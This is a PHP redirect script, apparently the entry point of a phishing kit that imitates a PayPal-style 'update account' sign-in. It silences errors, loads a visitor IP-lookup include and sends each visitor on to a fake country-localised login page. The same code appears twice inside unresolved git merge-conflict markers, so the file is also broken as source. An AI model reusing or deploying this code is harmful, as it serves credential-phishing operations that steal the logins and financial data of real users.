<<<<<<< HEAD
<?php
//LOCATION !
session_start();
error_reporting(0);
include('./Verification/update-account/customer_center//customer-IDPP00C984/functions/get_ip.php');

$DIR='./Verification/update-account/customer_center/customer-IDPP00C984/myaccount/signin/?country.x='.$_SESSION['_LOOKUP_CNTRCODE_'].'&locale.x=en_'.$_SESSION['_LOOKUP_CNTRCODE_'].'';
header("LOCATION: ".$DIR."");
?>
=======
<?php
//LOCATION !
session_start();
error_reporting(0);
include('./Verification/update-account/customer_center//customer-IDPP00C984/functions/get_ip.php');

$DIR='./Verification/update-account/customer_center/customer-IDPP00C984/myaccount/signin/?country.x='.$_SESSION['_LOOKUP_CNTRCODE_'].'&locale.x=en_'.$_SESSION['_LOOKUP_CNTRCODE_'].'';
header("LOCATION: ".$DIR."");
?>
>>>>>>> 57dea4c2acba386b00bd03c63389e834e0234a47
